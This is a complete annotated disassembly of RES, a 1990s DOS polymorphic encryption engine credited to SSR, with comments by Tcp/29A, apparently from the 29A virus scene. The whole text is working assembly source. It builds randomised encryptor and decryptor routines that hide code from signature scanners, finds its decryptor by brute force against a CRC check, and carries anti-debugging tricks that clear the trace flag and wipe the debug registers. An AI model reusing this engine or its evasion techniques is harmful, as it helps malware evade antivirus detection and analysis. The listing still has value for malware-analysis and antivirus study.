; - -[RES.ASM]- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - >8
;
; Random Encryption Synthezator (RES), by SSR
; Disasm by Tcp/29A (tcp@cryogen.com)
;
;
; Entry:
;  DS:DX = code
;  BX = runtime offset
;  CX = number of bytes to encrypt
; Return:
;  DS:DX = encryptor+code
;  CX = size encryptor+code


                .386p
                RES    segment use16
                assume cs:RES, ds:RES, es:RES, ss:RES
                org    0

RES_SIZE_DEC    equ     300h    ; But it only needs 169h

res_engine:
start:
		call    res_delta
res_delta:
		pop     si
                sub     si,3            ; Get delta-offset
		pop     ax
		push    cs
		push    ax
		push    es
		mov     ax,es
		sub     ax,10h
		mov     es,ax
		mov     di,100h
		push    cx
                mov     cx,offset(end_res)
		nop
		push    ds
		push    cs
		pop     ds
		cld
                rep     movsb           ; Copy RES code to working area
		pop     ds
		pop     cx
		mov     ax,offset(res_start+100h)
		push    es
		push    ax
                retf                    ; jmp res_start

res_start:
		pop     es
		mov     si,100h
		mov     ax,es
                add     ax,(end_res-start+15)/16+1
                mov     es,ax           ; Calculate base segment for decryptor
                mov     cs:[si+runtime_ofs],bx
                mov     cs:[si+code_length],cx
		push    cx
                mov     cx,RES_SIZE_DEC
		xor     di,di
		mov     al,90h          ; NOP
		cld     
		rep     stosb           ; Fill with NOPs
		call    init_masks
		mov     cx,8            ; 8 instructions per decryptor
		xor     di,di
		add     di,si
l_select_instructions:
		push    cx
		call    RES_get_random
		mov     ah,0
		push    cx
		mov     cl,5
		shr     al,cl           ; AX in [0..7]
		shl     ax,1
		shl     ax,1            ; AX:=AX*4 (4 bytes per instruction)
		pop     cx
		push    di
		push    si
		add     di,offset(buffer_decryptor)
		add     si,offset(decryptor_table)
		add     si,ax
		push    ax
                mov     ax,cs:[si]      ; Select an instruction for decryptor
                mov     cs:[di],ax      ; and store it
		mov     ax,cs:[si+2]
		mov     cs:[di+2],ax
		pop     ax
		pop     si
		pop     di
		push    di
		push    si
		add     di,offset(buffer_encryptor)
		add     si,offset(encryptor_table)
		add     si,ax
		push    ax
                mov     ax,cs:[si]      ; Select the instruction for encryptor
		mov     cs:[di],ax      ; and store it
		mov     ax,cs:[si+2]
		mov     cs:[di+2],ax
		pop     ax
		pop     si
		pop     di
		add     di,4
		pop     cx
                loop    l_select_instructions
                call    reverse_decryptor_table
                call    make_encryptor
		pop     cx
		push    cx
		mov     bp,dx
                mov     di,RES_SIZE_DEC
		mov     cs:[si+code_CRC],0
l_encrypt_code:
		mov     al,ds:[bp]
		mov     es:[di],al
		mov     ah,0
		add     cs:[si+code_CRC],ax     ; Make code CRC

encryptor       db      8*4 dup(90h)            ; Buffer for encryptor

                inc     di
		inc     bp
		loop    l_encrypt_code
		push    ds
		push    cs
		pop     ds
		xor     di,di
		push    si
                add     si,offset(decryptor_code)
                mov     cx,decrypted_code-decryptor_code
		nop     
		cld     
		rep     movsb           ; Copy decryptor to buffer
		pop     si
		pop     ds
		push    es
		pop     ds
                xor     dx,dx           ; DS:DX = Address of decryptor+code
		pop     cx
                add     cx,RES_SIZE_DEC ; Decryptor+encrypted code
		retf    

		db      0
		db      'RandomEncryptionSynthezator',0
		db      'ü S.S.R. 1996-97',0

init_masks:
		push    si
                mov     cx,3    ; Only first 3 instructions need a mask
l_next_mask:
		call    RES_get_random
                mov     byte ptr cs:[si+decryptor_table+3],al   ; Store mask
                mov     byte ptr cs:[si+encryptor_table+3],al
                add     si,4                                    ; Next inst.
		loop    l_next_mask
		pop     si
		ret     

RES_get_random:
		pushf   
		in      al,40h         ; Get random number
		ror     al,1
		xor     al,53h
		popf    
		ret     

make_encryptor:
		push    es
		push    ds
		push    cs
		pop     es
		push    cs
		pop     ds
		push    si
		in      al,40h          ; Get random number
		mov     cx,8
                mov     di,offset(encryptor)
		add     di,si
                add     si,offset(buffer_encryptor)
l_make_encryptor:
                rcr     al,1            ; Add instruction to encryptor?
		jc      add_instruction ; Yes? then jmp
		nop     
		nop     
		add     si,4
loop_make_encryptor:
                loop    l_make_encryptor
                jmp     encryptor_done
		nop     

add_instruction:
		cld     
		push    cx
		mov     cx,4
		rep     movsb           ; Store instruction
		pop     cx
                jmp     loop_make_encryptor

encryptor_done:
		pop     si
		pop     ds
		pop     es
		ret     

reverse_decryptor_table:
		push    ax
		push    bp
		push    di
		push    cx
		push    bx
                mov     cx,8/2
		mov     di,offset(buffer_decryptor)
		add     di,si
                mov     bp,offset(end_buffer_dec)-4     ; Point to last inst.
		add     bp,si
l_reverse_table:
                mov     ax,cs:[di]      ; Xchg instructions
		mov     bx,cs:[bp]
		mov     cs:[di],bx
		mov     cs:[bp],ax
		mov     ax,cs:[di+2]
		mov     bx,cs:[bp+2]
		mov     cs:[di+2],bx
		mov     cs:[bp+2],ax
                sub     bp,4            ; xchg next instruction
		add     di,4
                loop    l_reverse_table
		pop     bx
		pop     cx
		pop     di
		pop     bp
		pop     ax
		ret     

                db      4               ; Unused !!

decryptor_code:
runtime_ofs     equ     word ptr $+1
                mov     bp,0                    ; mov bp,runtime_ofs
                push    1100h+(90h+3Ch-20h)
                sub     bp,offset(decryptor_code)
                mov     di,offset(decryptor)
		add     di,bp
                pop     ax                      ; AX:=1100h+(90h+3Ch-20h)
                inc     cs:[bp+n_decryptors]    ; Inc # of tested decryptors
		mov     cs:[bp+decryptor_ok],0  ; Decryptor not found
		mov     cs:[bp+decrypting],0    ; Not decrypting
		mov     cx,20h
		push    es
		push    ds
		add     ax,cx
		push    cs
		pop     es
		push    cs
		pop     ds
		cld     
		dec     cx
		sub     al,3Ch                  ; AL:=90h (NOP)
		rep     stosb
		add     al,3Ch                  ; AL:=0CCh (int 3)
		stosb
                cmp     cs:[bp+n_decryptors],150 ; < 150 decryptors tested?
                jb      create_random_decryptor  ; Yes? then jmp
		nop     
		nop     
                mov     ax,cs:[bp+n_decryptors] ; Don't use a random number.
                                ; n_decryptors will be increased, so it'll
                                ; find the correct decryptor.
		jmp     create_decryptor
		nop     

                db      66h             ; Unused!? (antidebug??)

create_random_decryptor:
		in      al,40h          ; Get random number
create_decryptor:
                mov     cs:[bp+decryptor_id],al ; Why? Never use it!!
		mov     cx,8
                mov     si,offset(buffer_decryptor)
		add     si,bp
                mov     di,offset(decryptor)
		add     di,bp
l_make_random_decryptor:
		rcr     al,1            ; Add instruction to decryptor?
		jc      add_inst_dec    ; Yes? then jmp
		nop     
		nop     
		add     si,4
next_dec_instruction:
		loop    l_make_random_decryptor
		jmp     done_random_decryptor
		nop     

add_inst_dec:
		cld     
		push    cx
		mov     cx,4
		rep     movsb           ; Add instruction
		pop     cx
		jmp     next_dec_instruction

done_random_decryptor:
                mov     di,RES_SIZE_DEC
                add     di,cs:[bp+runtime_ofs]
code_length     equ     word ptr $+1
                mov     cx,0                    ; mov cx,code_length
                mov     bx,cs:[bp+code_CRC]
l_random_decryptor:
		mov     dl,cs:[di]

decryptor       db      8*4 dup(90h)

                mov     al,dl
		mov     ah,0
		sub     bx,ax                   ; Calculate CRC
		cmp     cs:[bp+decrypting],1    ; Decrypting?
		je      decrypt_byte            ; Yes? then jmp
		nop     
		nop     
loop_decryptor:
		inc     di
		loop    l_random_decryptor
		pop     ds
		pop     es
                cmp     bx,0                    ; CRC OK?
                jnz     decryptor_code          ; No? then jmp
                jmp     found_decryptor         ; Yes? then jmp
		nop     

buffer_decryptor db     8*4 dup(90h)
end_buffer_dec:

code_CRC        dw      0
decryptor_ok    db      0
decrypting      db      0
                db      0Bh     ; Unused!
                db      0Bh     ; Unused!
                db      0Bh     ; Unused!
decryptor_id    db      0                
n_decryptors    dw      0

decrypt_byte:
		mov     cs:[di],dl      ; Store decrypted byte
		jmp     loop_decryptor

found_decryptor:
		cmp     cs:[bp+decryptor_ok],1  ; Code decrypted?
		je      code_decrypted          ; Yes? then jmp
		nop     
		nop     
		mov     cs:[bp+decrypting],1
		mov     cs:[bp+decryptor_ok],1
		push    es
		push    ds
		jmp     done_random_decryptor   ; Decrypt code

code_decrypted:
		jmp     anti_disasm1
		nop     
                db      69h             ; Antidebug
anti_disasm1:
		cli
		push    3545h
		jmp     anti_disasm2
		nop
                db      0EAh            ; Antidebug
anti_disasm2:
		cli
		inc     sp
                mov     ax,cs:[bp]
		xor     ax,bx
		cld     
		scasb
		inc     sp
		mov     ax,4202h
		sub     sp,2
		pop     ax
                cmp     ax,3545h        ; Is it being traced?
                jne     decrypted_code  ; Yes? then jmp
                                        ; BUG! Should jump when not traced
		nop     
                nop
                xor     ax,3445h
		mov     es,ax
		inc     byte ptr cs:[0Dh]
		and     cx,0Fh
		rep     scasb
		xor     ax,cs:[si]
		pushf   
                pop     ax                      ; Get flags
                and     ah,0FEh                 ; Clear trace flag
		push    ax
		xchg    bx,cx
		les     bx,ds:[2Bh]
                popf                            ; Trace flag off
		xor     eax,eax
                mov     dr7,eax                 ; Clear all breakpoints
		dec     byte ptr cs:[0Dh]
                call    skip_reset
                db      0EAh    ; jmp far ptr 0F000h:0FFF0h (reset)
                dw      0FFF0h  ;  but never reach here because in 'skip_reset'
                dw      0F000h  ;  it does a pop of the return address

skip_reset:
		pop     ax
decrypted_code:                 ; End of decryptor code

encryptor_table:
		xor     byte ptr es:[di],0
		add     byte ptr es:[di],0
		sub     byte ptr es:[di],0
		nop     
		ror     byte ptr es:[di],1
		nop     
		rol     byte ptr es:[di],1
		nop     
		neg     byte ptr es:[di]
		nop     
		not     byte ptr es:[di]
		nop     
		neg     byte ptr es:[di]

decryptor_table:
		nop
		xor     dl,0
		nop     
		sub     dl,0
		nop     
		add     dl,0
		nop     
		nop     
		rol     dl,1
		nop     
		nop     
		ror     dl,1
		nop     
		nop     
		neg     dl
		nop     
		nop     
		not     dl
		nop     
		nop     
		neg     dl

buffer_encryptor db     8*4 dup(90h)

end_res:

RES             ends
public          res_engine
                end

; End of RES disasm
; (c) 1997, Tcp/29A (tcp@cryogen.com)
